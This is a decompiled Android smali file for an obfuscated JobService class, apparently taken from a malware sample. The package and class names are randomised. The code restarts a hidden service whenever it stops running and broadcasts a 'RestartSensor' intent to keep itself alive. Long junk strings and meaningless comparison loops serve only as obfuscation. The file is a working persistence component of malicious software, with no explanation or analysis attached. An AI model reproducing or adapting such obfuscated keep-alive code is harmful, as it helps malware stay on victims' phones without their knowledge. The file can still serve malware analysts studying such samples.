.class public Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;
.super Landroid/app/job/JobService;
.source "ecnjvratcclfbtkkyctntbosk9.java"


# instance fields
.field private JobId:I


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 16
    invoke-direct {p0}, Landroid/app/job/JobService;-><init>()V

    const/16 v0, 0x64

    .line 19
    iput v0, p0, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->JobId:I

    return-void
.end method

.method private isServiceWork(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 2

    const-string v0, "activity"

    .line 105
    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/ActivityManager;

    const/16 v0, 0x64

    .line 106
    invoke-virtual {p1, v0}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object p1

    const/4 v0, 0x0

    if-nez p1, :cond_0

    return v0

    .line 110
    :cond_0
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_1
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 111
    iget-object v1, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v1

    .line 112
    invoke-virtual {v1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 p1, 0x1

    return p1

    :cond_2
    return v0
.end method


# virtual methods
.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 22
    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-class p3, Lginom/alfa/lib/scan/SensorRestarterBroadcastReceiver;

    invoke-direct {p1, p2, p3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string p2, "RestartSensor"

    invoke-virtual {p1, p2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->sendBroadcast(Landroid/content/Intent;)V

    const/4 p1, 0x1

    return p1
.end method

.method public onStartJob(Landroid/app/job/JobParameters;)Z
    .locals 5

    const/4 p1, 0x0

    .line 33
    :try_start_0
    const-class v0, Lginom/alfa/lib/scan/xyxieqqhgkvmzrkvuldqgwuyc3;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, p0, v0}, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->isServiceWork(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 35
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lginom/alfa/lib/scan/xyxieqqhgkvmzrkvuldqgwuyc3;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_5

    :catch_0
    const/4 v0, 0x1

    .line 38
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 39
    :cond_0
    :goto_0
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const-string v3, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    if-eqz v2, :cond_1

    .line 41
    sput-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 42
    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 44
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 49
    :cond_1
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 50
    :cond_2
    :goto_1
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3

    .line 52
    sput-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 53
    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 55
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 59
    :cond_3
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 60
    :cond_4
    :goto_2
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_5

    .line 62
    sput-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 63
    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 65
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 70
    :cond_5
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 71
    :cond_6
    :goto_3
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_7

    .line 73
    sput-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 74
    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 76
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    .line 80
    :cond_7
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    .line 81
    :cond_8
    :goto_4
    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_9

    .line 83
    sput-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 84
    sget-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    .line 86
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_4

    .line 92
    :cond_9
    :goto_5
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lginom/alfa/lib/scan/SensorRestarterBroadcastReceiver;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "RestartSensor"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lginom/alfa/lib/scan/ecnjvratcclfbtkkyctntbosk9;->sendBroadcast(Landroid/content/Intent;)V

    return p1
.end method

.method public onStopJob(Landroid/app/job/JobParameters;)Z
    .locals 0

    const/4 p1, 0x0

    return p1
.end method
